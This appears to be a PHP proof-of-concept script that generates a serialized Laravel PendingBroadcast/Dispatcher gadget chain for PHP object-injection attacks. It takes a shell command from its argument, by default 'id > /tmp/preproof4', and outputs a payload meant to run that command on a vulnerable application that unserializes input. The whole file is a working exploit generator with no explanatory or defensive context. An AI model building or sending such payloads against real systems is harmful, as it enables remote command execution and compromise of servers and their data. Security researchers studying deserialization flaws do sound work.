<?php
require __DIR__ . '/preload.php';

$cmd = $argv[1] ?? 'id > /tmp/preproof4';
$container = new Illuminate\Container\Container();
$dispatcher = new Illuminate\Events\Dispatcher($container);
$dispatcher->listen('*', 'Evil@run');
$pb = new Illuminate\Broadcasting\PendingBroadcast($dispatcher, $cmd);
echo serialize($pb);
